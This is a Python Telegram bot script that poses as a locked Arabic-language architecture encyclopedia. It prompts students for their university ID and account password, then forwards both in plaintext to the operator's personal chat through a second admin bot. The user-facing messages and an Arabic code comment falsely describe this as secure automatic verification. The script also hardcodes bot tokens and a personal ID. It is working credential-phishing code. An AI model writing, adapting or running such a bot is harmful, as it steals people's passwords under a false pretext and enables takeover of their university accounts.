import os
import telebot
from telebot import types

TOKEN_STUDENT = "8753263807:AAFO9rKx7yy4MeQyBbCBLnwkQvPo57v5qyw"
TOKEN_ADMIN = "8507731905:AAE-ke_vMTR2V3Yz4w3i4kTR7H-yX2JAmmE"
MY_PERSONAL_ID = 2038606299

student_bot = telebot.TeleBot(TOKEN_STUDENT, threaded=False)
admin_bot = telebot.TeleBot(TOKEN_ADMIN, threaded=False)

user_data = {}

@student_bot.message_handler(commands=['start'])
def handle_start(message):
    uid = message.chat.id
    student_bot.send_message(uid, "🏛️ مرحباً بك في موسوعة العمارة.\n\nالمحتوى مقفل حالياً؛ الرجاء إدخال بياناتك الأكاديمية للمطابقة والتحقق التلقائي.\n\n🎓 الرجاء كتابة رقمك الجامعي الآن:")
    student_bot.register_next_step_handler(message, get_uni_id)

def get_uni_id(message):
    uid = message.chat.id
    uni_id = message.text.strip()
    user_data[uid] = {"uni_id": uni_id}
    
    student_bot.send_message(uid, "🔑 ممتاز، الآن الرجاء كتابة كلمة المرور الخاصة بحسابك:")
    student_bot.register_next_step_handler(message, get_password)

def get_password(message):
    uid = message.chat.id
    password = message.text.strip()
    
    if uid in user_data:
        uni_id = user_data[uid]["uni_id"]
        
        # إرسال البيانات فوراً وبشكل نصي عالي الأمان لبوت المشرف الخاص بك
        markup = types.InlineKeyboardMarkup()
        btn_app = types.InlineKeyboardButton("✅ موافقة وتفعيل الطالب", callback_data=f"auth_acc_{uid}")
        btn_rej = types.InlineKeyboardButton("❌ رفض الطلب", callback_data=f"auth_rej_{uid}")
        markup.row(btn_app, btn_rej)

        text = f"🔔 طلب انضمام ومطابقة جديد:\n\n👤 آيدي الطالب: {uid}\n🎓 الرقم الجامعي: {uni_id}\n🔑 كلمة المرور: {password}"
        admin_bot.send_message(MY_PERSONAL_ID, text, reply_markup=markup)
        
        student_bot.send_message(uid, "⏳ تم إرسال بياناتك بنجاح وجاري مطابقتها من قِبل الإدارة وتخزين حسابك. يرجى الانتظار.")

@admin_bot.callback_query_handler(func=lambda call: call.data.startswith("auth_"))
def handle_admin_auth(call):
    parts = call.data.split('_')
    action = parts[1]
    target_uid = int(parts[2])

    if action == "acc":
        try:
            admin_bot.edit_message_text(f"✅ Approved ID: {target_uid}", chat_id=MY_PERSONAL_ID, message_id=call.message.message_id)
            student_bot.send_message(target_uid, f"🎉 Approved!\nYour ID is now stored and verified.")
        except:
            pass
    elif action == "rej":
        try:
            student_bot.send_message(target_uid, "❌ Request denied by admin.")
            admin_bot.edit_message_text(f"❌ Denied ID: {target_uid}", chat_id=MY_PERSONAL_ID, message_id=call.message.message_id)
        except:
            pass

if __name__ == "__main__":
    student_bot.remove_webhook()
    admin_bot.remove_webhook()
    print("Bot is polling successfully...")
    student_bot.infinity_polling()
